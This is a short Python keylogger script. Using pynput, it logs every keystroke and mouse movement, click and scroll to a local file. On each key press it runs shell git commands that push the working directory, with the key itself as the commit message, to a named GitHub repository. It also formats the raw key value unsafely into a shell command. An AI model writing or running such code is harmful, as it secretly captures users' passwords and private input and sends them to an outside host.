import logging
import time
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import os

log_dir = ""
logging.basicConfig(filename="mouseKeyLog.txt",level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info("Key pressed: {0}".format(key))
    print("Key pressed: {0}".format(key))
    # push file to git
    os.system("git add . && git commit -m '{0}' && git push".format(key))
    os.system("git branch -M main")
    os.system("git remote add origin https://github.com/hamzah-sajid-code/logger.git")
    os.system("git push origin main")


def on_release(key):
    logging.info("Key released: {0}".format(key))


def on_move(x, y):
    logging.info("Mouse move to ({0},{1})".format(x, y))


def on_click(x, y, button, pressed):
    if pressed:
        logging.info('Mouse clicked ar ({0},{1}) with {2}'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
    
keyboard_listener = KeyboardListener(on_press=on_press, on_release=on_release)
mouse_listener = MouseListener(
    on_move=on_move, on_click=on_click, on_scroll=on_scroll)

keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()
